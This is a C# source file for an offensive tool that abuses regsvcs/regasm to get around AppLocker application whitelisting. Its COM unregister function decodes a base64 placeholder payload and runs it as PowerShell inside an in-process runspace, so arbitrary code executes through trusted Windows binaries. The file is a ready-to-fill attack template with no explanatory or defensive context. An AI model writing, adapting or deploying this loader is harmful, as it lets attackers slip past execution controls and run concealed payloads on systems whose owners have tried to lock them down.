using System;
using System.EnterpriseServices;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;
//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
[assembly: AssemblyKeyFileAttribute("meta.snk")]

namespace Bypass_Regsvc_regasm_AppLocker
{
    public class Bypass : ServicedComponent
    {
        static void Main()
        {

        }

        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            Console.WriteLine("Follow the white rabbit!");
            string encCommand = "!INSERTCODEHERE!";
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke rInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
            //Decode the base64 encoded command
            byte[] data = Convert.FromBase64String(encCommand);
            string command = Encoding.ASCII.GetString(data);
            pipeline.Commands.AddScript(command);
            pipeline.Invoke();
            runspace.Close();

            return;
        }
    }
}